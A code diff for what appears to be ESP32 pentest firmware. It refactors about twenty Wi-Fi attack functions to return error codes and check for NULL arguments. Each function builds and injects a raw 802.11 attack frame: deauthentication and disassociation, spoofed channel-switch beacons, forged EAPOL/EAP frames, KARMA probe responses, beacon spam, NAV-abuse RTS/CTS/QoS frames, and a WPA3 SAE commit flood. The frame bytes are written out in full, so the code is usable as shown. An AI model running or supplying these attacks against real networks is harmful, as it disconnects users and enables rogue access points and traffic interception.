@@ -35,9 +35,9 @@
 
 static const char *TAG = "WIFI_ATTACKS";
 
-void wifi_attack_deauth_basic(const uint8_t dest[6], const uint8_t bssid[6], uint8_t reason_code)
+esp_err_t wifi_attack_deauth_basic(const uint8_t dest[6], const uint8_t bssid[6], uint8_t reason_code)
 {
-    if(bssid == NULL) return;
+    if(bssid == NULL) return ESP_ERR_INVALID_ARG;
 
     uint8_t deauth_packet[26] = {
         0xC0, 0x00, // Frame Control (Deauth)
@@ -59,12 +59,14 @@ void wifi_attack_deauth_basic(const uint8_t dest[6], const uint8_t bssid[6], uin
     deauth_packet[24] = reason_code;       // Reason Code
 
     /* Send packet */
-    esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
+    return esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
 }
 
 
-void wifi_attack_send_disassoc(const uint8_t bssid[6], const uint8_t dest[6], uint8_t reason)
+esp_err_t wifi_attack_send_disassoc(const uint8_t bssid[6], const uint8_t dest[6], uint8_t reason)
 {
+    if(bssid == NULL || dest == NULL) return ESP_ERR_INVALID_ARG;
+
     uint8_t packet[26] = {
         0xA0, 0x00,                         // Frame Control (Disassociation)
         0x3A, 0x01,                         // Duration
@@ -80,12 +82,14 @@ void wifi_attack_send_disassoc(const uint8_t bssid[6], const uint8_t dest[6], ui
     memcpy(&packet[16], bssid, 6);
     packet[24] = reason; 
 
-    esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
+    return esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
 }
 
 
-void wifi_attack_send_auth_frame(const uint8_t bssid[6], const uint8_t src_mac[6])
+esp_err_t wifi_attack_send_auth_frame(const uint8_t bssid[6], const uint8_t src_mac[6])
 {
+    if(bssid == NULL || src_mac == NULL) return ESP_ERR_INVALID_ARG;
+
     uint8_t packet[30] = {
         0xB0, 0x00,                         // Frame Control (Authentication)
         0x3A, 0x01,                         // Duration
@@ -102,12 +106,14 @@ void wifi_attack_send_auth_frame(const uint8_t bssid[6], const uint8_t src_mac[6
     memcpy(&packet[10], src_mac, 6);
     memcpy(&packet[16], bssid, 6);
 
-    esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
+    return esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
 }
 
 
-void wifi_attack_send_assoc_req(const uint8_t bssid[6], const uint8_t src_mac[6])
+esp_err_t wifi_attack_send_assoc_req(const uint8_t bssid[6], const uint8_t src_mac[6])
 {
+    if(bssid == NULL || src_mac == NULL) return ESP_ERR_INVALID_ARG;
+
     // Association Request minimale
     uint8_t packet[50] = {
         0x00, 0x00,                         // FC (Assoc Req)
@@ -127,12 +133,13 @@ void wifi_attack_send_assoc_req(const uint8_t bssid[6], const uint8_t src_mac[6]
     memcpy(&packet[10], src_mac, 6);
     memcpy(&packet[16], bssid, 6);
 
-    esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
+    return esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
 }
 
 
-void wifi_attack_send_csa_beacon(const uint8_t bssid[6], const uint8_t src_mac[6], uint8_t new_channel)
+esp_err_t wifi_attack_send_csa_beacon(const uint8_t bssid[6], const uint8_t src_mac[6], uint8_t new_channel)
 {
+    if(bssid == NULL || src_mac == NULL) return ESP_ERR_INVALID_ARG;
     // Beacon Frame spoofato con CSA IE (Tag 37)
     // Questo dice ai client: "L'AP sta cambiando canale, spostatevi su X!"
     
@@ -159,13 +166,13 @@ void wifi_attack_send_csa_beacon(const uint8_t bssid[6], const uint8_t src_mac[6
     memcpy(&packet[10], bssid, 6);
     memcpy(&packet[16], bssid, 6);
 
-    esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
+    return esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
 }
 
 
-void wifi_attack_deauth_client_invalid_PMKID(const uint8_t client[6], const uint8_t bssid[6])
+esp_err_t wifi_attack_deauth_client_invalid_PMKID(const uint8_t client[6], const uint8_t bssid[6])
 {
-    if(client == NULL || bssid == NULL) return;
+    if(client == NULL || bssid == NULL) return ESP_ERR_INVALID_ARG;
 
     static uint64_t replay_counter = 2000;
 
@@ -236,14 +243,14 @@ void wifi_attack_deauth_client_invalid_PMKID(const uint8_t client[6], const uint
         eapol_packet_invalid_PMKID[41 + i] = (replay_counter >> (56 - i * 8)) & 0xFF;
     }
 
-    esp_wifi_80211_tx(WIFI_IF_STA, eapol_packet_invalid_PMKID, sizeof(eapol_packet_invalid_PMKID), false);
     replay_counter++;
+    return esp_wifi_80211_tx(WIFI_IF_STA, eapol_packet_invalid_PMKID, sizeof(eapol_packet_invalid_PMKID), false);
 }
 
 
-void wifi_attack_deauth_client_bad_msg1(const uint8_t client[6], const uint8_t bssid[6], const wifi_auth_mode_t authmode)
+esp_err_t wifi_attack_deauth_client_bad_msg1(const uint8_t client[6], const uint8_t bssid[6], const wifi_auth_mode_t authmode)
 {
-    if(client == NULL || bssid == NULL) return;
+    if(client == NULL || bssid == NULL) return ESP_ERR_INVALID_ARG;
 
     static uint64_t replay_counter = 0;
     uint8_t frame_size = 153; // Size of the EAPOL frame
@@ -315,15 +322,15 @@ void wifi_attack_deauth_client_bad_msg1(const uint8_t client[6], const uint8_t b
         frame_size = frame_size - 22; // Adjust frame size for WPA3
     }
 
-    esp_wifi_80211_tx(WIFI_IF_STA, eapol_packet_bad_msg1, frame_size, false);
     /* Increase replay counter for next packet */
     replay_counter++;
+    return esp_wifi_80211_tx(WIFI_IF_STA, eapol_packet_bad_msg1, frame_size, false);
 }
 
 
-void wifi_attack_association_sleep(const uint8_t client[6], const uint8_t bssid[6], const char *ssid)
+esp_err_t wifi_attack_association_sleep(const uint8_t client[6], const uint8_t bssid[6], const char *ssid)
 {
-    if(client == NULL || bssid == NULL || ssid == NULL) return;
+    if(client == NULL || bssid == NULL || ssid == NULL) return ESP_ERR_INVALID_ARG;
 
     static uint16_t sequence_number = 0;
     uint8_t assoc_packet[200] = {
@@ -434,14 +441,14 @@ void wifi_attack_association_sleep(const uint8_t client[6], const uint8_t bssid[
     assoc_packet[offset++] = 0x00;
     assoc_packet[offset++] = 0x02;
 
-    esp_wifi_80211_tx(WIFI_IF_STA, assoc_packet, offset, false);
     sequence_number += 0x10; // Increment sequence number by 16;
+    return esp_wifi_80211_tx(WIFI_IF_STA, assoc_packet, offset, false);   
 }
 
 
-void wifi_attack_deauth_ap_eapol_logoff(const uint8_t client[6], const uint8_t bssid[6])
+esp_err_t wifi_attack_deauth_ap_eapol_logoff(const uint8_t client[6], const uint8_t bssid[6])
 {
-    if(client == NULL || bssid == NULL) return;
+    if(client == NULL || bssid == NULL) return ESP_ERR_INVALID_ARG;
 
     uint8_t eapol_logoff_packet[38] = {
         0x88, 0x11, // Frame Control (EAPOL)
@@ -461,13 +468,13 @@ void wifi_attack_deauth_ap_eapol_logoff(const uint8_t client[6], const uint8_t b
     memcpy(&eapol_logoff_packet[4], bssid, 6);      // Destination Address (AP)
     memcpy(&eapol_logoff_packet[16], bssid, 6);     // BSSID
 
-    esp_wifi_80211_tx(WIFI_IF_STA, eapol_logoff_packet, sizeof(eapol_logoff_packet), false);
+    return esp_wifi_80211_tx(WIFI_IF_STA, eapol_logoff_packet, sizeof(eapol_logoff_packet), false);
 }
 
 
-void wifi_attack_deauth_client_eap_failure(const uint8_t client[6], const uint8_t bssid[6])
+esp_err_t wifi_attack_deauth_client_eap_failure(const uint8_t client[6], const uint8_t bssid[6])
 {
-    if(client == NULL || bssid == NULL) return;
+    if(client == NULL || bssid == NULL) return ESP_ERR_INVALID_ARG;
 
     static uint8_t identity = 0;
     uint8_t eap_failure_packet[40] = {
@@ -500,13 +507,13 @@ void wifi_attack_deauth_client_eap_failure(const uint8_t client[6], const uint8_
     memcpy(&eap_failure_packet[10], bssid, 6);   // A2: Sorgente (BSSID)
     memcpy(&eap_failure_packet[16], bssid, 6);   // A3: BSSID
 
-    esp_wifi_80211_tx(WIFI_IF_STA, eap_failure_packet, sizeof(eap_failure_packet), false);
+    return esp_wifi_80211_tx(WIFI_IF_STA, eap_failure_packet, sizeof(eap_failure_packet), false);
 }
 
 
-void wifi_attack_deauth_client_eap_rounds(const uint8_t client[6], const uint8_t bssid[6])
+esp_err_t wifi_attack_deauth_client_eap_rounds(const uint8_t client[6], const uint8_t bssid[6])
 {
-    if(client == NULL || bssid == NULL) return;
+    if(client == NULL || bssid == NULL) return ESP_ERR_INVALID_ARG;
 
     static uint8_t identity = 0;
     uint8_t eap_identity_request_packet[41] = {
@@ -540,13 +547,13 @@ void wifi_attack_deauth_client_eap_rounds(const uint8_t client[6], const uint8_t
     memcpy(&eap_identity_request_packet[10], bssid, 6);   // A2
     memcpy(&eap_identity_request_packet[16], bssid, 6);   // A3
     
-    esp_wifi_80211_tx(WIFI_IF_STA, eap_identity_request_packet, sizeof(eap_identity_request_packet), false);
+    return esp_wifi_80211_tx(WIFI_IF_STA, eap_identity_request_packet, sizeof(eap_identity_request_packet), false);
 }
 
 
-void wifi_attack_deauth_ap_eapol_start(const uint8_t client[6], const uint8_t bssid[6])
+esp_err_t wifi_attack_deauth_ap_eapol_start(const uint8_t client[6], const uint8_t bssid[6])
 {
-    if(client == NULL || bssid == NULL) return;
+    if(client == NULL || bssid == NULL) return ESP_ERR_INVALID_ARG;
 
     uint8_t eapol_start_packet[36] = {
         0x08, 0x02, // Frame Control (EAPOL)
@@ -564,13 +571,13 @@ void wifi_attack_deauth_ap_eapol_start(const uint8_t client[6], const uint8_t bs
     memcpy(&eapol_start_packet[10], bssid, 6);    // Source Address
     memcpy(&eapol_start_packet[16], bssid, 6);    // BSSID
 
-    esp_wifi_80211_tx(WIFI_IF_STA, eapol_start_packet, sizeof(eapol_start_packet), false);
+    return esp_wifi_80211_tx(WIFI_IF_STA, eapol_start_packet, sizeof(eapol_start_packet), false);
 }
 
 
-void wifi_attack_deauth_client_negative_tx_power(const uint8_t bssid[6], uint8_t channel, const char *ssid)
+esp_err_t wifi_attack_deauth_client_negative_tx_power(const uint8_t bssid[6], uint8_t channel, const char *ssid)
 {
-    if(ssid == NULL || bssid == NULL) return;
+    if(ssid == NULL || bssid == NULL) return ESP_ERR_INVALID_ARG;
 
     uint8_t packet[256];
     
@@ -637,13 +644,13 @@ void wifi_attack_deauth_client_negative_tx_power(const uint8_t bssid[6], uint8_t
     packet[offset++] = 0x00; // Offset (Subito)
     packet[offset++] = 0x00;
 
-    esp_wifi_80211_tx(WIFI_IF_STA, packet, offset, false);
+    return esp_wifi_80211_tx(WIFI_IF_STA, packet, offset, false);
 }
 
 
-void wifi_attack_softap_beacon_spam(const char *ssid, uint8_t channel)
+esp_err_t wifi_attack_softap_beacon_spam(const char *ssid, uint8_t channel)
 {
-    if(ssid == NULL) return;
+    if(ssid == NULL) return ESP_ERR_INVALID_ARG;
 
     uint8_t mac[6] = { 0 };
     uint8_t beacon_frame[256] = {
@@ -690,11 +697,11 @@ void wifi_attack_softap_beacon_spam(const char *ssid, uint8_t channel)
     beacon_frame[offset++] = 0x01;             // Length
     beacon_frame[offset++] = channel;       // Channel Number
 
-    esp_wifi_80211_tx(WIFI_IF_STA, beacon_frame, offset, false);
+    return esp_wifi_80211_tx(WIFI_IF_STA, beacon_frame, offset, false);
 }
 
 
-void wifi_attack_send_karma_probe_response(const uint8_t *victim_mac, const char *requested_ssid, uint8_t channel)
+esp_err_t wifi_attack_send_karma_probe_response(const uint8_t *victim_mac, const char *requested_ssid, uint8_t channel)
 {
     uint8_t my_mac[6];
     esp_wifi_get_mac(WIFI_IF_AP, my_mac);
@@ -704,7 +711,7 @@ void wifi_attack_send_karma_probe_response(const uint8_t *victim_mac, const char
 
     if (ret_create != 0) {
         ESP_LOGE("KARMA", "Errore creazione struct probe response");
-        return;
+        return ESP_FAIL;
     }
 
     uint8_t buffer[256];
@@ -712,7 +719,7 @@ void wifi_attack_send_karma_probe_response(const uint8_t *victim_mac, const char
     if (frame_len == 0) {
         ESP_LOGE("KARMA", "Errore dump probe response");
         libwifi_free_probe_resp(&probe_resp_logic);
-        return;
+        return ESP_FAIL;
     }
     
     /* Spam */
@@ -722,12 +729,13 @@ void wifi_attack_send_karma_probe_response(const uint8_t *victim_mac, const char
     }
 
     libwifi_free_probe_resp(&probe_resp_logic);
+    return ESP_OK;
 }
 
 
-void wifi_attack_nav_abuse_rts(const uint8_t bssid[6])
+esp_err_t wifi_attack_nav_abuse_rts(const uint8_t bssid[6])
 {
-    if (bssid == NULL) return;
+    if (bssid == NULL) return ESP_ERR_INVALID_ARG;
 
     // Frame RTS (Request to Send) - Type Control (0x1), Subtype RTS (0xB) -> 0xB4
     // Duration: 32767 microsecondi (0x7FFF) - Il massimo valore per bloccare il canale
@@ -742,12 +750,13 @@ void wifi_attack_nav_abuse_rts(const uint8_t bssid[6])
     memcpy(&rts_packet[4], bssid, 6);   // Receiver: Target AP (lo costringiamo a leggere)
     memcpy(&rts_packet[10], bssid, 6);  // Transmitter: Target AP (sembra che sia LUI a chiedere silenzio)
 
-    esp_wifi_80211_tx(WIFI_IF_STA, rts_packet, 16, false); 
+    return esp_wifi_80211_tx(WIFI_IF_STA, rts_packet, 16, false); 
 }
 
 
-void wifi_attack_nav_abuse_cts(const uint8_t bssid[6])
+esp_err_t wifi_attack_nav_abuse_cts(const uint8_t bssid[6])
 {
+    if (bssid == NULL) return ESP_ERR_INVALID_ARG;
     // CTS Frame (10 bytes + FCS calcolato dal driver)
     // Structure: FC (2) + Duration (2) + RA (6)
     uint8_t cts_packet[10] = {
@@ -762,12 +771,14 @@ void wifi_attack_nav_abuse_cts(const uint8_t bssid[6])
 
     memcpy(&cts_packet[4], bssid, 6); 
 
-    esp_wifi_80211_tx(WIFI_IF_STA, cts_packet, sizeof(cts_packet), false);
+    return esp_wifi_80211_tx(WIFI_IF_STA, cts_packet, sizeof(cts_packet), false);
 }
 
 
-void wifi_attack_nav_abuse_qos_null(const uint8_t target[6], const uint8_t bssid[6])
+esp_err_t wifi_attack_nav_abuse_qos_null(const uint8_t target[6], const uint8_t bssid[6])
 {
+    if (target == NULL || bssid == NULL) return ESP_ERR_INVALID_ARG;
+
     static uint16_t seq = 0;
     // Frame QoS Null (Type: Data, Subtype: QoS Null)
     // Should bypass hardware check because its a data frame not control frame
@@ -797,12 +808,14 @@ void wifi_attack_nav_abuse_qos_null(const uint8_t target[6], const uint8_t bssid
     memcpy(&qos_null_packet[10], target, 6); // A2: Chi siamo (Target vittima o Random)
     memcpy(&qos_null_packet[16], bssid, 6);  // A3: BSSID
 
-    esp_wifi_80211_tx(WIFI_IF_STA, qos_null_packet, sizeof(qos_null_packet), false);
+    return esp_wifi_80211_tx(WIFI_IF_STA, qos_null_packet, sizeof(qos_null_packet), false);
 }
 
 
-void wifi_attack_nav_abuse_qos_data(const uint8_t target[6], const uint8_t bssid[6])
+esp_err_t wifi_attack_nav_abuse_qos_data(const uint8_t target[6], const uint8_t bssid[6])
 {
+    if (target == NULL || bssid == NULL) return ESP_ERR_INVALID_ARG;
+
     static uint16_t sequence_counter = 0; 
     // Usiamo QoS DATA (0x88)
     // 26 byte header + 1 byte payload = 27 byte
@@ -838,12 +851,14 @@ void wifi_attack_nav_abuse_qos_data(const uint8_t target[6], const uint8_t bssid
     qos_data_packet[22] = seq_field & 0xFF;
     qos_data_packet[23] = (seq_field >> 8) & 0xFF;
 
-    esp_wifi_80211_tx(WIFI_IF_STA, qos_data_packet, sizeof(qos_data_packet), false);
+    return esp_wifi_80211_tx(WIFI_IF_STA, qos_data_packet, sizeof(qos_data_packet), false);
 }
 
 
-void wifi_attack_nav_abuse_qos_data_broadcast(const uint8_t ap_bssid[6])
+esp_err_t wifi_attack_nav_abuse_qos_data_broadcast(const uint8_t ap_bssid[6])
 {
+    if (ap_bssid == NULL) return ESP_ERR_INVALID_ARG;
+
     static uint16_t seq_num = 0;
     uint8_t packet[27] = {
         // Frame Control: QoS Data (0x88) + FromDS (0x02) = 0x8A
@@ -875,13 +890,13 @@ void wifi_attack_nav_abuse_qos_data_broadcast(const uint8_t ap_bssid[6])
     packet[22] = seq_field & 0xFF;
     packet[23] = (seq_field >> 8) & 0xFF;
 
-    esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
+    return esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
 }
 
 
-void wifi_attack_wpa3_sae_flood(const uint8_t bssid[6])
+esp_err_t wifi_attack_wpa3_sae_flood(const uint8_t bssid[6])
 {
-    if (bssid == NULL) return;
+    if (bssid == NULL) return ESP_ERR_INVALID_ARG;
 
     // Buffer aumentato per contenere il payload completo
     uint8_t sae_commit_packet[150]; 
@@ -939,5 +954,5 @@ void wifi_attack_wpa3_sae_flood(const uint8_t bssid[6])
     offset += sizeof(sae_payload);
 
     // Invio (Usa la tecnica burst/no-delay discussa prima per saturare)
-    esp_wifi_80211_tx(WIFI_IF_STA, sae_commit_packet, offset, false);
+    return esp_wifi_80211_tx(WIFI_IF_STA, sae_commit_packet, offset, false);
 }
